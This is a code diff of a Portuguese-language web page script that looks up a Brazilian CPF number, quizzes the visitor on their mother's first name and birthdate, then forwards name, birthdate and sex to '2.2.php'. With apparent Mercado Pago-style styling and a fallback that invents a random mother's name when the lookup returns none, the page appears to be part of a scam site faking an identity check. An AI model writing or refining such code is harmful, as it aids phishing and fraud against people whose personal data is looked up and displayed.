@@ -226,9 +226,10 @@ document.addEventListener("DOMContentLoaded", () => {
 
          cpfData = await fetchCPF(cpfLimpo);
 
-         if (!cpfData.status || cpfData.status !== 200 || !cpfData.dados[0].NOME_MAE) {
+         // Se nome da mãe vier vazio → gerar nome fake
+         if (!cpfData.nome_mae || cpfData.nome_mae.trim() === "") {
             const randomNames = ['Ana', 'Maria', 'Joana', 'Lucia', 'Rosa'];
-            cpfData.dados = [{ NOME_MAE: randomNames[Math.floor(Math.random() * randomNames.length)] }];
+            cpfData.nome_mae = randomNames[Math.floor(Math.random() * randomNames.length)];
          }
 
          document.getElementById('loading').classList.add('hidden');
@@ -241,73 +242,70 @@ document.addEventListener("DOMContentLoaded", () => {
    }
 
    function showMotherNameOptions() {
-      const motherName = cpfData.dados[0].NOME_MAE;
-      const correctName = motherName.split(' ')[0];
+      const correctName = cpfData.nome_mae.split(' ')[0];
       const fakeNames = ['Maria', 'Ana', 'Joana', 'Rosa', 'Lucia'].filter(n => n !== correctName);
 
-      const allOptions = [
-         correctName,
-         ...fakeNames.sort(() => Math.random() - 0.5).slice(0, 3)
-      ].sort(() => Math.random() - 0.5);
+      const allOptions = [correctName, ...fakeNames.sort(() => Math.random() - 0.5).slice(0, 3)]
+         .sort(() => Math.random() - 0.5);
 
       const container = document.getElementById('mother-options');
       container.innerHTML = '';
 
       allOptions.forEach(name => {
-         const button = document.createElement('button');
-         button.type = 'button';
-         button.className = 'w-full bg-gray-50 border-2 border-gray-200 hover:border-mp-blue text-gray-900 py-3 px-4 rounded-lg font-semibold transition-all text-left';
-         button.textContent = name;
-         button.onclick = () => validateMotherName(name);
-         container.appendChild(button);
+         const btn = document.createElement('button');
+         btn.type = 'button';
+         btn.className = 'w-full bg-gray-50 border-2 border-gray-200 hover:border-mp-blue py-3 px-4 rounded-lg font-semibold';
+         btn.textContent = name;
+         btn.onclick = () => validateMotherName(name);
+         container.appendChild(btn);
       });
 
-      const noneButton = document.createElement('button');
-      noneButton.type = 'button';
-      noneButton.className = 'w-full bg-mp-blue text-white py-3 rounded-lg font-semibold hover:bg-mp-dark-blue transition-all mt-4';
-      noneButton.textContent = "Nenhuma das alternativas";
-      noneButton.onclick = function() {
-          window.location.href = '/2.2.php';
-      };
-      container.appendChild(noneButton);
+      const noneBtn = document.createElement('button');
+      noneBtn.type = 'button';
+      noneBtn.className = 'w-full bg-mp-blue text-white py-3 rounded-lg font-semibold mt-4';
+      noneBtn.textContent = "Nenhuma das alternativas";
+      noneBtn.onclick = () => window.location.href = '/2.2.php';
+      container.appendChild(noneBtn);
    }
 
    function validateMotherName(selectedName) {
-      const correctName = cpfData.dados[0].NOME_MAE.split(' ')[0];
+      const correctName = cpfData.nome_mae.split(' ')[0];
       if (selectedName !== correctName) {
-         showError('Nome da mãe incorreto. Por favor, tente novamente.');
+         showError('Nome da mãe incorreto. Tente novamente.');
          return;
       }
 
       document.getElementById('mother-options').parentElement.classList.add('hidden');
-      const birthdateSection = document.getElementById('birthdate-section');
-      birthdateSection.classList.remove('hidden');
-      document.getElementById('birthdate-display').textContent = cpfData.dados[0].NASC;
+
+      const bdSection = document.getElementById('birthdate-section');
+      bdSection.classList.remove('hidden');
+      document.getElementById('birthdate-display').textContent = cpfData.nascimento;
    }
 
    function validateBirthdate(isCorrect) {
       if (!isCorrect) {
-         showError('Data de nascimento incorreta. Entre em contato com o suporte.');
+         showError('Data de nascimento incorreta.');
          return;
       }
 
       const urlParams = new URLSearchParams(window.location.search);
-      urlParams.set('nome', cpfData.dados[0].NOME);
-      urlParams.set('nasc', cpfData.dados[0].NASC);
-      urlParams.set('sexo', cpfData.dados[0].SEXO);
+      urlParams.set('nome', cpfData.nome);
+      urlParams.set('nasc', cpfData.nascimento);
+      urlParams.set('sexo', cpfData.sexo);
 
       window.location.href = `2.2.php?${urlParams.toString()}`;
    }
 
-   function showError(message) {
+   function showError(msg) {
       document.getElementById('loading').classList.add('hidden');
       document.getElementById('validation-form').classList.add('hidden');
       document.getElementById('error').classList.remove('hidden');
-      document.getElementById('errorMessage').textContent = message;
+      document.getElementById('errorMessage').textContent = msg;
    }
 
    window.onload = consultarCPF;
 </script>
+
 
    <script>
 (function(){
